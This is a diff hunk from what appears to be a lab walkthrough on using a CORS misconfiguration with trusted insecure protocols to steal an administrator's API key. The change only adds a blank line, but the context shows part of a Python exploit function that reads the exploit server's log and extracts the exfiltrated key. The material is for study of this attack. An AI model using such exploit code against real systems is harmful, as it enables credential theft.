@@ -103,6 +103,7 @@ Extracting the administrator API-KEY using CORS vulnerability with trusted insec
      5. Then get_apikey() function is called. In this function, API-KEY is extracted using regular expression.
      <br>
      
+     
      ```        
      def get_apikey():
           res = requests.get(k_exploit_server + '/log', proxies=proxy_urls, verify=False)
